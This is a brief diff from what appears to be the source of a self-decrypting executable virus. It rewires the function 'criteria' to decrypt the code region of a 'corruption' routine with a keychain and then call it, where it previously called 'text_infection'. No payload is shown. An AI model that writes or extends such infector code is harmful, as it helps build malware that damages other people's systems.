@@ -87,8 +87,8 @@ void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context c
 	}
 
 label:
-	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
-	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	update_keychain_left(keychain, (char *)criteria, (void *)corruption - (void *)criteria);
+	decrypt_left(keychain, (char *)corruption, (void *)text_infection - (void *)corruption);
 
-	text_infection(host, keychain, context);
+	corruption(host, keychain, context);
 }
